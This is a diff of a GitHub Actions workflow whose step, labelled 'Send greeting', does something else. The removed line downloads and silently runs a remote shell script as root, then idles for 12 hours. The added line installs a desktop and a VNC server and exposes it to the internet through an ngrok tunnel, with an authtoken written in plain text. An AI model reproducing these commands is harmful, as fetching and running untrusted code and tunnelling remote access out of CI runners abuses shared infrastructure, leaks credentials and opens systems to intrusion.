@@ -27,4 +27,4 @@ jobs:
     steps:
     # Runs a single command using the runners shell
     - name: Send greeting
-      run: sudo apt update && sudo wget https://my.adsvy.com/CRD_COLAB_EXE.sh &> /dev/null && sudo chmod +x CRD_COLAB_EXE.sh && sudo ./CRD_COLAB_EXE.sh && sudo sleep 43200
+      run: sudo su && apt update && apt install wget && apt -y install xfce4 && apt -y install firefox && apt install tightvncserver && tightvncserver :1 && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && apt install unzip && unzip ngrok-stable-linux-amd64.zip && apt -y install screen && screen -R test && ./ngrok authtoken 1iX7KZI6l9uc0cLD5Pj4eStvQnF_7EhMLbe6Y9sFZtD5CNP2g && ./ngrok tcp 5901
